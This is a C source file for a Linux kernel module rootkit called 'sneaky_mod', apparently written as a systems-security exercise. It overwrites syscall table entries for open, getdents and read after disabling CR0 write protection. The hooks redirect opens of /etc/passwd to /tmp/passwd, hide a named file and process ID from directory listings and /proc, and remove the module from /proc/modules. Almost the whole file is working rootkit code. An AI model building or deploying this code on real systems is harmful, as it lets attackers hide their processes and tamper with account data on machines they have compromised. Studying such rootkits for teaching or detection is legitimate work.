#include <asm/cacheflush.h>
#include <asm/current.h> // process information
#include <asm/page.h>
#include <asm/unistd.h>    // for system call constants
#include <linux/highmem.h> // for changing page permissions
#include <linux/init.h>    // for entry/exit macros
#include <linux/kallsyms.h>
#include <linux/kernel.h> // for printk and other kernel bits
#include <linux/module.h> // for all modules
#include <linux/sched.h>
#define BUFFLEN 64
// For the getdents function
struct linux_dirent {
  u64 d_ino;
  s64 d_off;
  unsigned short d_reclen;
  char d_name[BUFFLEN];
};

static char *sneaky_process_id = "";
module_param(sneaky_process_id, charp, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
MODULE_PARM_DESC(sneaky_process_id, "Sneaky process pid");

// Macros for kernel functions to alter Control Register 0 (CR0)
// This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
// Bit 0 is the WP-bit (write protection). We want to flip this to 0
// so that we can change the read/write permissions of kernel pages.
#define read_cr0() (native_read_cr0())
#define write_cr0(x) (native_write_cr0(x))

// These are function pointers to the system calls that change page
// permissions for the given address (page) to read-only or read-write.
// Grep for "set_pages_ro" and "set_pages_rw" in:
//      /boot/System.map-`$(uname -r)`
//      e.g. /boot/System.map-4.4.0-116-generic
void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff81072040;
void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81071fc0;

// This is a pointer to the system call table in memory
// Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
// We're getting its adddress from the System.map file (see above).
static unsigned long *sys_call_table = (unsigned long *)0xffffffff81a00200;

// Function pointer will be used to save address of original 'open' syscall.
// The asmlinkage keyword is a GCC #define that indicates this function
// should expect ti find its arguments on the stack (not in registers).
// This is used for all system calls.
asmlinkage int (*original_call)(const char *pathname, int flags);
asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp,
                                    unsigned int count);
asmlinkage ssize_t (*original_read)(int fd, void *buf, size_t count);

// Check whether user has opened /proc/modules
static int proc_modules_opened = -1;

// Define our new sneaky version of the 'open' syscall
asmlinkage int sneaky_sys_open(const char *pathname, int flags) {
  printk(KERN_INFO "Very, very Sneaky!\n");
  const char *tmp_pathname = "/tmp/passwd";
  if (strcmp(pathname, "/etc/passwd") == 0) {
    // User opens /etc/passwd so we want to be evil
    printk(KERN_INFO "User opened /etc/passwd!");
    copy_to_user((void *)pathname, tmp_pathname, strlen(tmp_pathname) + 1);

  } else if (strcmp(pathname, "/proc/modules") == 0) {
    printk(KERN_INFO "User opened proc/modules!");
    proc_modules_opened = 1;
  }
  return original_call(pathname, flags);
}

asmlinkage int sneaky_getdents(unsigned int fd, struct linux_dirent *dirp,
                               unsigned int count) {
  int bpos = 0;
  struct linux_dirent *cur;
  printk(KERN_INFO "in getdents!\n");
  int found = 0;
  int nread = original_getdents(fd, dirp, count);
  while (bpos < nread) {
    cur = (struct linux_dirent *)((char *)dirp + bpos);
    int recv_len = (int)cur->d_reclen;
    char d_type = *((char *)dirp + bpos + recv_len - 1);
    if ((d_type == DT_REG) && (strcmp(cur->d_name, "sneaky_process") == 0)) {
      // ls, find
      found = 1;
    } else if ((d_type == DT_DIR) &&
               (strcmp(cur->d_name, sneaky_process_id) == 0)) {
      // directory in /proc
      found = 1;
    }
    if (found == 1) {
      char *source = (char *)cur + recv_len;
      int move_len = nread - (int)(((char *)cur + recv_len - (char *)dirp));
      memmove(cur, source, move_len);
      nread -= recv_len;
      found = 0;
      continue;
    }
    bpos += recv_len;
  }

  return nread;
}

asmlinkage int sneaky_read(int fd, void *buf, size_t count) {
  ssize_t nread = original_read(fd, buf, count);

  if (nread > 0 && proc_modules_opened == 1) {
    proc_modules_opened = 0;
    char *pos_start = strstr(buf, "sneaky_mod");
    if (pos_start != NULL) {
      char *pos_end = pos_start;
      while (*pos_end != '\n') {
        pos_end++;
      }
      ssize_t move_len = (ssize_t)(nread - (pos_end + 1 - (char *)buf));
      memmove(pos_start, pos_end + 1, move_len);
      nread = (ssize_t)(nread - (pos_end + 1 - pos_start));
    }
  }
  return nread;
}

// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void) {
  struct page *page_ptr;

  // See /var/log/syslog for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  // Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));
  // Get a pointer to the virtual page containing the address
  // of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  // Make this page read-write accessible
  pages_rw(page_ptr, 1);

  // This is the magic! Save away the original 'open' system call
  // function address. Then overwrite its address in the system call
  // table with the function address of our new code.
  original_call = (void *)*(sys_call_table + __NR_open);
  *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;

  original_getdents = (void *)*(sys_call_table + __NR_getdents);
  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_getdents;

  original_read = (void *)*(sys_call_table + __NR_read);
  *(sys_call_table + __NR_read) = (unsigned long)sneaky_read;

  // Revert page to read-only
  pages_ro(page_ptr, 1);
  // Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);

  return 0; // to show a successful load
}

static void exit_sneaky_module(void) {
  struct page *page_ptr;

  printk(KERN_INFO "Sneaky module being unloaded.\n");

  // Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));

  // Get a pointer to the virtual page containing the address
  // of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  // Make this page read-write accessible
  pages_rw(page_ptr, 1);

  // This is more magic! Restore the original 'open' system call
  // function address. Will look like malicious code was never there!
  *(sys_call_table + __NR_open) = (unsigned long)original_call;
  *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
  *(sys_call_table + __NR_read) = (unsigned long)original_read;
  // Revert page to read-only
  pages_ro(page_ptr, 1);
  // Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);
}

module_init(initialize_sneaky_module); // what's called upon loading
module_exit(exit_sneaky_module);       // what's called upon unloading
